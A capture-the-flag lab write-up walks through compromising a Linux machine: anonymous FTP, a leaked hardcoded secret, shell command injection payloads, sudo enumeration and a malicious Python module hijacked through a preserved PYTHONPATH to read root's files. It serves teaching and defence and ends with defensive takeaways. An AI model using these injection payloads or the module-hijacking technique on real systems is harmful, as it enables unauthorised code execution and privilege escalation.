---
type: writeup
platform: Exegol
room: Batman's Secret
os: Linux
environment: Custom Service / Linux Privilege Escalation
last_verified: 2026-09-28

techniques:
  - anonymous-ftp
  - source-code-disclosure
  - hardcoded-secret
  - command-injection
  - sudo-abuse
  - python-module-hijacking

tools:
  - nmap
  - ftp
  - netcat
  - sudo
  - base64
  - python3
---
**Attack path:** Anonymous FTP → source-code disclosure → hardcoded service secret → OS command injection as `bruce` → sudo enumeration → preserved `PYTHONPATH` → Python module hijacking → root

## 1. Reconnaissance

Initial service enumeration:

```bash
nmap -sV -sC <TARGET_IP>
```

Relevant services:

```bash
21/tcp    FTP    vsftpd 3.0.5
22/tcp    SSH    OpenSSH
3000/tcp  custom Gotham Hotline service
```

Nmap also showed that anonymous FTP authentication was enabled.

The custom service on port `3000` was unusual, while FTP provided an immediate unauthenticated enumeration path.

---

## 2. Anonymous FTP and Source-Code Disclosure

The FTP server accepted anonymous access:

```bash
ftp <TARGET_IP>
```

```bash
Username: anonymous
Password: [empty]
```

Enumeration revealed:

```text
alert.py
logs/
└── report.txt
```

The Python application was downloaded:

```bash
ftp> get alert.py
```

and reviewed locally:

```bash
cat alert.py
```

The source code disclosed a hardcoded authentication secret used by the custom service:

```bash
Authentication secret: <REDACTED>
```

More importantly, it contained:

```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

The `alert_text` value originated from user-controlled input and was inserted directly into a shell command.

This created an **OS Command Injection** vulnerability.

---

## 3. Command Injection → `bruce`

The Gotham Hotline service was accessed directly:

```bash
nc <TARGET_IP> 3000
```

Authentication used the secret recovered from `alert.py`:

```bash
Authentication: <REDACTED>
```

A minimal command-injection payload was used to determine the execution identity:

```bash
test'; id > /opt/hotline/logs/report.txt; #
```

The injected single quote terminates the original quoted string, the command executes `id`, and `#` comments out the remainder of the intended shell command.

The resulting `report.txt` was retrieved through FTP and contained:

```bash
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
```

This confirmed arbitrary command execution as:

```bash
bruce
```

The same primitive was used to retrieve the user flag:

```bash
test'; cat /home/bruce/user.txt > /opt/hotline/logs/report.txt; #
```

The output was recovered from the FTP-accessible logs directory:

```bash
ftp> cd logs
ftp> get report.txt
```

```bash
THM{REDACTED}
```

At this stage, the initial compromise was established as command execution under the `bruce` account.

---

## 4. Sudo Enumeration Through Command Injection

Because there was no interactive shell documented at this point, local enumeration continued through the command-injection primitive.

Sudo permissions were requested and redirected into the FTP-readable report:

```bash
test'; sudo -l > /opt/hotline/logs/report.txt 2>&1; #
```

Relevant result:

```bash
Matching Defaults entries for bruce on gotham:
    mail_badpass, env_keep+=PYTHONPATH, use_pty

User bruce may run the following commands on gotham:
    (root) NOPASSWD: /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

Two details mattered:

```text
bruce can run gotham_scanner.py as root without a password
+
sudo preserves PYTHONPATH
```

The preserved `PYTHONPATH` suggested that Python's module-resolution behavior might be controllable during privileged execution.

---

## 5. Inspecting the Root-Executed Python Script

The sudo-authorized script was read through the existing command injection:

```bash
test'; cat /opt/scanner/gotham_scanner.py > /opt/hotline/logs/report.txt 2>&1; #
```

Relevant imports included:

```python
import time
import re
```

The script later called:

```python
re.search(...)
```

Because the root Python process inherited `PYTHONPATH`, an attacker-controlled directory could potentially be inserted into Python's module search path.

If that directory contained:

```bash
re.py
```

Python could import the attacker's module instead of the legitimate `re` module.

The privilege boundary was therefore:

```text
bruce controls PYTHONPATH
        +
sudo preserves PYTHONPATH
        +
root executes Python script importing re
        =
potential module hijacking as root
```

---

## 6. Building the Malicious Python Module

A malicious `re.py` was created locally:

```python
with open("/root/root.txt", "r") as src:
    flag = src.read()

with open("/opt/hotline/logs/root_flag.txt", "w") as dst:
    dst.write(flag)

def search(*args, **kwargs):
    return None
```

The module performs two important actions when imported:

```text
read /root/root.txt
        ↓
write its contents to /opt/hotline/logs/root_flag.txt
```

A dummy `search()` function was also defined because the legitimate scanner expected to call:

```python
re.search(...)
```

This allowed the malicious module to satisfy the interface expected by the root-executed script.

---

## 7. Transferring `re.py`

Anonymous FTP allowed files to be read, but direct uploads were refused:

```bash
550 Permission denied.
```

The malicious module therefore could not simply be uploaded through FTP.

It was encoded locally instead:

```bash
base64 -w0 re.py
```

The resulting Base64 data was passed through the command-injection primitive and decoded on the target:

```bash
echo <BASE64_DATA> | base64 -d > /tmp/re.py
```

The resulting file was verified:

```bash
ls -l /tmp/re.py
```

```bash
-rw-rw-r-- 1 bruce bruce ... /tmp/re.py
```

`bruce` now controlled a Python module in `/tmp`.

---

## 8. Python Module Hijacking → root

The privileged scanner was executed with `/tmp` supplied through `PYTHONPATH`:

```bash
export PYTHONPATH=/tmp; sudo /usr/bin/python3 /opt/scanner/gotham_scanner.py
```

The crucial sudo configuration was:

```bash
env_keep+=PYTHONPATH
```

so the environment variable survived the transition from `bruce` to the root process.

The resulting import path was effectively influenced so that:

```python
import re
```

could resolve to:

```bash
/tmp/re.py
```

The malicious module was therefore imported during execution of the Python process running as `root`.

Its top-level code read:

```bash
/root/root.txt
```

and wrote the result to:

```bash
/opt/hotline/logs/root_flag.txt
```

This confirmed arbitrary Python code execution in the privileged context.

---

## 9. Confirming Root Execution

The generated file was visible through anonymous FTP:

```bash
-rw-r--r-- 1 0 0 ... root_flag.txt
```

The UID and GID:

```bash
0 0
```

showed that the file had been created by `root`.

It was retrieved through FTP:

```bash
ftp> cd logs
ftp> get root_flag.txt
```

The final flag is redacted in the public version:

```bash
THM{REDACTED}
```

The compromise had therefore progressed from unauthenticated network access to privileged root execution.

---

## Key Takeaways

- Anonymous FTP becomes significantly more dangerous when it exposes application source code and operational files.
- Hardcoded service secrets in downloadable source code turn information disclosure into authenticated access.
- User-controlled data passed directly to `os.system()` creates an OS command-injection primitive.
- A sudo rule should be evaluated together with the environment it preserves; `env_keep+=PYTHONPATH` was critical to this escalation.
- Running a fixed Python script as root is not necessarily safe if a lower-privileged user can influence Python's module search path.
- Python module hijacking depends on both attacker control over module resolution and privileged execution of an import.
- Failed FTP upload did not end the attack path: the existing command-injection primitive provided an alternative way to create the malicious module on the target.